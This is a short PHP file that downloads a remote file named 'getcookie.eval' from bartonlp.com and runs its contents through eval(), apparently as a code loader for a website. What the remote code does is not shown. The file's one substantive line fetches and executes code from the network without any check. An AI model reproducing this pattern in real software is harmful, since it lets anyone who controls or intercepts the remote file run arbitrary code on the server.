<?php
$page = file_get_contents("https://bartonlp.com/otherpages/getcookie.eval");
return eval("?>". $page);
